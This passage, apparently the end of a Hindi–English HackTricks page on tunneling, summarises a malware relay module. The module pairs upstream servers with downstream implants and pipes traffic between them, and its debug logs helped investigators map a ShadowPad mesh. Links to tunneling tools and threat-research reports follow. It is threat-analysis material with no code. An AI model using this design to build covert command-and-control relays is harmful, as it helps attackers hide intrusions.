* **Relay orchestration** – module दो lists maintain करता है: “servers” (upstream nodes) और “clients” (downstream implants)। यदि लगभग 30 seconds के भीतर कोई heartbeat नहीं आता, तो entries को prune कर दिया जाता है। जब दोनों lists non-empty होती हैं, तो यह पहले healthy server को पहले healthy client के साथ pair करता है और एक side के close होने तक उनके sockets के बीच bytes को simply pipe करता है।
* **Debug telemetry** – optional logging प्रत्येक pairing के लिए source IP, destination IP और total forwarded bytes record करती है। Investigators ने इन breadcrumbs का उपयोग कई victims तक फैले ShadowPad mesh को rebuild करने के लिए किया।

---

## जांचने के लिए अन्य tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
